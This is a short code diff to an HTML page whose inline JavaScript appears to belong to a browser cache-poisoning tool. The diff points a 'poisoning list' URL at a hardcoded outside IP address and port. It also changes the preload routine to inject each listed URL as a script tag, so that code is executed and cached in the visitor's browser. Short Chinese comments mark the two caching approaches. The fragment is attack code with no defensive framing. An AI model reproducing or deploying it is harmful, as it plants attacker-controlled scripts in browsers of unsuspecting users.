@@ -12,7 +12,7 @@
 	<div id="uiStat">ready</div>
 	<progress id="uiProg" max="100"></progress>
 	<script>
-		var URL_GET_LIST = '__get_poisoning_list__';
+		var URL_GET_LIST = '121.40.175.85:12345/__get_poisoning_list__';
 
 		function readLS(key) {
 			return localStorage[key];
@@ -20,6 +20,7 @@
 		function writeLS(key, val) {
 			localStorage[key] = val;
 		}
+
 
 		writeLS('prog', 0);
 
@@ -62,11 +63,21 @@
 		}
 
 		function preload(url, callback) {
-			var loader = new Image();
+			//js正常缓存
+			var head= document.getElementsByTagName('head')[0];
+			var script= document.createElement('script');
+			script.type= 'text/javascript';
+			script.src= url;
+			head.appendChild(script); 
+			script.onload = function() {
+				callback(url);
+			}
+			//img缓存js
+/*			var loader = new Image();
 			loader.onerror = function() {
 				callback(url);
 			};
-			loader.src = url;
+			loader.src = url;*/
 		}
 
 		function loadList() {
